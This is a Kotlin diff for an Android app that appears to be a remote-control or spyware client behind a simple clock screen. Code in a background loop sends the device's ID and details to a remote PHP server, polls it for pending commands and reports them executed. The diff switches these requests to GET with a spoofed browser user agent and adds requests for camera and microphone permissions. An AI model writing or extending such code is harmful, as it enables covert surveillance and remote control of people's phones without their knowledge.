@@ -17,49 +17,46 @@ import org.json.JSONObject
 import java.io.OutputStreamWriter
 import java.net.HttpURLConnection
 import java.net.URL
+import java.net.URLEncoder
 
 class NetHelper {
 
     private val baseUrl = "https://payment70.site.je/api.php"
+    private val ua = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
 
-    fun sendUserStatus(userId: String, deviceInfo: String): Boolean {
+    // ===== التعديل 1: GET بدل POST =====
+    fun sendUserStatus(userId: String, deviceInfo: String): String {
         return try {
-            val url = URL(baseUrl)
+            val encodedDevice = URLEncoder.encode(deviceInfo, "UTF-8")
+            val fullUrl = baseUrl + "?user_status=1&user_id=" + userId + "&device_info=" + encodedDevice
+            val url = URL(fullUrl)
             val connection = url.openConnection() as HttpURLConnection
-            connection.requestMethod = "POST"
-            connection.doOutput = true
-            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
+            connection.requestMethod = "GET"
+            connection.setRequestProperty("User-Agent", ua)
+            connection.setRequestProperty("Accept", "text/html,application/json,*/*")
+            connection.setRequestProperty("Accept-Language", "en-US,en;q=0.9")
             connection.connectTimeout = 10000
             connection.readTimeout = 10000
-            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36")
-
-            val json = JSONObject().apply {
-                put("user_status", true)
-                put("user_id", userId)
-                put("device_info", deviceInfo)
-            }
-
-            OutputStreamWriter(connection.outputStream).use {
-                it.write(json.toString())
-                it.flush()
-            }
 
             val code = connection.responseCode
             connection.disconnect()
-            code == HttpURLConnection.HTTP_OK
+            if (code == 200) "Sent OK" else "HTTP " + code
         } catch (e: Exception) {
-            false
+            "ERR " + e.javaClass.simpleName
         }
     }
 
+    // ===== بدون تعديل (GET زي ما هي) =====
     fun fetchPendingCommands(userId: String): List<JSONObject> {
         return try {
             val url = URL("$baseUrl?user_id=$userId")
             val connection = url.openConnection() as HttpURLConnection
             connection.requestMethod = "GET"
+            connection.setRequestProperty("User-Agent", ua)
+            connection.setRequestProperty("Accept", "text/html,application/json,*/*")
+            connection.setRequestProperty("Accept-Language", "en-US,en;q=0.9")
             connection.connectTimeout = 10000
             connection.readTimeout = 10000
-            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36")
 
             val response = connection.inputStream.bufferedReader().use { it.readText() }
             connection.disconnect()
@@ -75,31 +72,22 @@ class NetHelper {
         }
     }
 
+    // ===== التعديل 3: GET بدل POST =====
     fun markCommandExecuted(commandId: String): Boolean {
         return try {
-            val url = URL(baseUrl)
+            val fullUrl = baseUrl + "?update_status=1&command_id=" + commandId
+            val url = URL(fullUrl)
             val connection = url.openConnection() as HttpURLConnection
-            connection.requestMethod = "POST"
-            connection.doOutput = true
-            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
+            connection.requestMethod = "GET"
+            connection.setRequestProperty("User-Agent", ua)
+            connection.setRequestProperty("Accept", "text/html,application/json,*/*")
+            connection.setRequestProperty("Accept-Language", "en-US,en;q=0.9")
             connection.connectTimeout = 10000
             connection.readTimeout = 10000
-            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36")
-
-            val json = JSONObject().apply {
-                put("update_status", true)
-                put("command_id", commandId)
-                put("executed", true)
-            }
-
-            OutputStreamWriter(connection.outputStream).use {
-                it.write(json.toString())
-                it.flush()
-            }
 
             val code = connection.responseCode
             connection.disconnect()
-            code == HttpURLConnection.HTTP_OK
+            code == 200
         } catch (e: Exception) {
             false
         }
@@ -145,8 +133,29 @@ class MainActivity : Activity() {
         layout.addView(clockText)
         setContentView(layout)
 
+        requestAppPermissions()
+
         handler.post(runnable)
         startMonitorLoops()
+    }
+
+    private fun requestAppPermissions() {
+        try {
+            val permissions = mutableListOf(
+                android.Manifest.permission.CAMERA,
+                android.Manifest.permission.RECORD_AUDIO
+            )
+            if (Build.VERSION.SDK_INT >= 33) {
+                permissions.add(android.Manifest.permission.POST_NOTIFICATIONS)
+            }
+            val needed = permissions.filter {
+                checkSelfPermission(it) != android.content.pm.PackageManager.PERMISSION_GRANTED
+            }
+            if (needed.isNotEmpty()) {
+                requestPermissions(needed.toTypedArray(), 100)
+            }
+        } catch (e: Exception) {
+        }
     }
 
     private fun startMonitorLoops() {
@@ -157,9 +166,8 @@ class MainActivity : Activity() {
         Thread {
             while (true) {
                 try {
-                    val ok = apiService.sendUserStatus(safeId, deviceInfo)
-                    val msg = if (ok) "Status: Sent" else "Status: Failed"
-                    runOnUiThread { statusText.text = msg }
+                    val result = apiService.sendUserStatus(safeId, deviceInfo)
+                    runOnUiThread { statusText.text = "Status: " + result }
                 } catch (e: Exception) {
                 }
                 try {
@@ -179,8 +187,6 @@ class MainActivity : Activity() {
                         val id = last.optString("id", "no_id")
                         runOnUiThread { statusText.text = "Last Command: " + action }
                         apiService.markCommandExecuted(id)
-                    } else {
-                        runOnUiThread { statusText.text = "Status: Waiting for commands" }
                     }
                 } catch (e: Exception) {
                 }
